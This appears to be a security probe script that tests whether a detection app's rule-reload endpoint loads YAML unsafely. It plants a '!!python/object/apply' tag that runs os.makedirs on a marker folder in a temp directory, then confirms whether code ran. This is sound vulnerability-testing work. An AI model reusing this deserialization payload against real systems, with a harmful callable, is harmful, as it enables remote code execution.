"""B-04 probe: a rule file with a Python tag, loaded through /admin/rules/reload.

    PYTHONPATH=. python scripts/probes/b04_yaml.py

In-process, no network. The payload is harmless: os.makedirs of a marker folder
inside a temp directory. If the folder appears, YAML ran a Python call.
"""

import json
import os
import tempfile
from pathlib import Path

os.environ["SENTINEL_API_KEY"] = "k-demo-0000000000"
from app import create_app  # noqa: E402

AUTH = {"X-API-Key": "k-demo-0000000000"}
root = Path(tempfile.mkdtemp())
app = create_app({"DB_PATH": str(root / "e.db"), "PROPAGATE_EXCEPTIONS": False})
client = app.test_client()
print("rules active before:", client.post("/admin/rules/reload", headers=AUTH).get_json())

evil = root / "rules"
evil.mkdir()
marker = root / "B04-MARKER"
(evil / "evil.yaml").write_text(f"!!python/object/apply:os.makedirs [{json.dumps(str(marker))}]\n",
                                encoding="utf-8")
print("rule file:", (evil / "evil.yaml").read_text(encoding="utf-8").replace(str(root), "<tmp>").strip())
app.config["RULES_DIR"] = str(evil)
resp = client.post("/admin/rules/reload", headers=AUTH)
body = (resp.get_json() or {}) if resp.is_json else {}
print(f"reload -> HTTP {resp.status_code} {body}")
print("marker folder created (Python code ran):", marker.exists())
event = {"ts": "2026-11-17T10:00:00", "src_ip": "10.0.0.9", "dst_ip": "10.0.0.5", "user": "root",
         "message": "sshd: Failed password for root from 10.0.0.9"}
tags = client.post("/ingest", json=event, headers=AUTH).get_json()["event"]["tags"]
print("detection still working after the reload attempt:", "rule:SL-0001" in tags)
